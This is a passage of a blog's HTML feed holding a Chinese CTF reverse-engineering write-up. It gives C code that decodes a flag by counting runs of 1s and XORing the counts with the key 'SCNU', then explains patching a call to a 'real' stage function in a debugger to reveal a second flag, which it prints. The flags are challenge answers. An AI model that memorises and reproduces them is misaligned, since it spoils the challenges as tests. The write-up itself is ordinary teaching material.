class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">255</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, idx_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> flag[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (enc[idx] == <span class="number">255</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (enc[idx] == <span class="number">1</span>)</span><br><span class="line">            c++;</span><br><span class="line">        <span class="keyword">if</span> (enc[idx] == <span class="number">0</span>) &#123;</span><br><span class="line">            flag[idx_flag++] = c;</span><br><span class="line">            c = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;SCNU&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx_flag; ++i)</span><br><span class="line">        <span class="built_in">putchar</span>(flag[i] ^ key[i % <span class="number">4</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>flag&#123;Winn3r_n0t_L0s3r_#&#125;</code></p><p>结束…</p><h1 id="toddler-regs">toddler_regs</h1><p>这个题我当时最后一个点莫名其妙跑出来的…</p><p>动调修改,第一步运行到stage_1()的调用处,patch汇编,把32改成23:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013153754275.png" alt="image-20231013153754275"></p><p>然后同样在调用j_stage_2_fake()时将call指令patch为<code>call j_stage_2_real</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013154357033.png" alt="image-20231013154357033" style="zoom:40%;" /><p>然后继续单步调试,直到提示从指定的地址读取flag,我们按g快捷键跳转过去提取出来即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013154450248.png" alt="image-20231013154450248" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013154512103.png" alt="image-20231013154512103" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>,</span><br><span class="line">                    <span class="number">116</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">95</span>,</span><br><span class="line">                    <span class="number">98</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>,</span><br><span class="line">                    <span class="number">74</span>, <span class="number">78</span>, <span class="number">85</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">49</span>,</span><br><span class="line">                    <span class="number">114</span>, <span class="number">100</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{Xp0int_1s_n1c3_but_Xp0intJNU_is_we1rd}</p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-11-字符串</title>
      <link href="/2023-10-06-b45ef26d6ec3/"/>
      <url>/2023-10-06-b45ef26d6ec3/</url>
      
